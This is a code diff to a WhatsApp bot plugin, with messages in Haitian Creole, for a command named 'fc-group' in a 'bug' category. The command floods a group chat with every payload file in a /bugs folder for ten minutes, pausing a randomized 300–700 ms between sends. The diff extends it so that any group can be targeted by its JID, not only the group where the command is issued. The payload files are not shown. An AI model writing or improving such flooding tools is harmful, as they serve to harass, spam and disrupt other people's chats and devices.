@@ -5,17 +5,22 @@ const path = require('path');
 
 cmd({
   pattern: 'fc-group',
-  desc: 'Flood group with all payloads from /bugs for 10 minutes',
+  desc: 'Flood group with all payloads from /bugs for 10 minutes, optionally target a specific group by JID',
   category: 'bug',
   react: '🔫',
   filename: __filename
-}, async (bot, mek, { from, reply, isGroup }) => {
+}, async (bot, mek, { from, reply, isGroup, arg }) => {
   try {
-    if (!isGroup) return await reply('❌ Command sa fèt pou group sèlman.');
+    let groupJid = arg && arg.trim() !== '' ? arg.trim() : from;
 
-    const groupJid = from;
+    if (!groupJid.endsWith('@g.us')) {
+      return await reply('❌ Tanpri bay yon group JID valab (fini ak @g.us)');
+    }
 
-    // 🛡️ Pwoteksyon kont spam pwòp gwoup ou oswa admin
+    if (groupJid === from && !isGroup) {
+      return await reply('❌ Kòmand sa a sèlman ka lanse nan yon gwoup oswa ak yon group JID valab kòm paramèt.');
+    }
+
     const protectedGroups = [
       '120363025555555555@g.us' // mete groupJid ou vle pwoteje
     ];
@@ -30,7 +35,6 @@ cmd({
       return await reply('📁 Pa gen payload nan folder /bugs la.');
     }
 
-    // ✅ Voye imaj ak detay avan atak la
     const imagePath = path.join(__dirname, '../media/5.png');
     if (fs.existsSync(imagePath)) {
       const imageBuffer = fs.readFileSync(imagePath);
@@ -40,7 +44,7 @@ cmd({
       }, { quoted: mek });
     }
 
-    const endTime = Date.now() + 10 * 60 * 1000; // 10 minit
+    const endTime = Date.now() + 10 * 60 * 1000;
 
     while (Date.now() < endTime) {
       for (const file of bugFiles) {
@@ -70,10 +74,9 @@ cmd({
           console.error(`❌ Error in ${file}:`, e.message);
         }
 
-        await new Promise(res => setTimeout(res, 300 + Math.floor(Math.random() * 400))); // 300–700ms
+        await new Promise(res => setTimeout(res, 300 + Math.floor(Math.random() * 400)));
       }
-
-      await new Promise(res => setTimeout(res, 1000)); // Delay ant sik
+      await new Promise(res => setTimeout(res, 1000));
     }
 
     await bot.sendMessage(groupJid, {
